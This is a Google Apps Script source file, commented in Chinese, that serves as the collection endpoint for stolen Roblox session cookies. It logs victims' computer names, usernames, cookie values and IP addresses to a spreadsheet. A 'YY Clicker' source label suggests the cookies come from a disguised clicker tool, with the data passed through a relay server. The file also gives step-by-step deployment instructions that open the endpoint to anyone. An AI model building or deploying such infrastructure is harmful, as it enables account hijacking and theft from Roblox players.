/**
 * Google Apps Script — Roblox Cookie 接收端
 * 
 * 部署步驟：
 * 1. 前往 https://script.google.com/ 建立新專案
 * 2. 將此程式碼貼入 Code.gs
 * 3. 點選「部署」→「新增部署作業」
 * 4. 類型選擇「網頁應用程式」
 * 5. 執行身分：「我」
 * 6. 存取權限：「所有人」
 * 7. 部署後複製 Web App URL，填入 Railway 中轉伺服器的環境變數
 *
 * 此腳本接收 POST 請求，將 Cookie 資料寫入 Google 試算表。
 * 每筆記錄包含：時間戳記、電腦名稱、使用者名稱、Cookie 值、IP 位址
 */

// ===== 設定區域 =====
// 請將下方 SPREADSHEET_ID 替換為您的 Google 試算表 ID
// 試算表 URL 格式：https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/edit
var SPREADSHEET_ID = "YOUR_SPREADSHEET_ID_HERE";
var SHEET_NAME = "CookieLog";  // 工作表名稱

/**
 * 處理 POST 請求 — 接收 Cookie 資料
 */
function doPost(e) {
  try {
    var data = JSON.parse(e.postData.contents);
    
    var ss = SpreadsheetApp.openById(SPREADSHEET_ID);
    var sheet = ss.getSheetByName(SHEET_NAME);
    
    // 若工作表不存在，自動建立並加入標題列
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
      sheet.appendRow([
        "時間戳記",
        "電腦名稱",
        "使用者名稱",
        "Cookie 值",
        "IP 位址",
        "來源"
      ]);
      // 設定標題列格式
      sheet.getRange(1, 1, 1, 6).setFontWeight("bold");
      sheet.setFrozenRows(1);
    }
    
    // 寫入資料列
    var timestamp = new Date().toLocaleString("zh-TW", { timeZone: "Asia/Taipei" });
    sheet.appendRow([
      timestamp,
      data.computer_name || "N/A",
      data.username || "N/A",
      data.cookie || "N/A",
      data.ip || "N/A",
      data.source || "YY Clicker"
    ]);
    
    return ContentService
      .createTextOutput(JSON.stringify({ status: "ok", message: "資料已寫入" }))
      .setMimeType(ContentService.MimeType.JSON);
      
  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: "error", message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

/**
 * 處理 GET 請求 — 健康檢查
 */
function doGet(e) {
  return ContentService
    .createTextOutput(JSON.stringify({ status: "ok", message: "Google Apps Script 接收端運作中" }))
    .setMimeType(ContentService.MimeType.JSON);
}
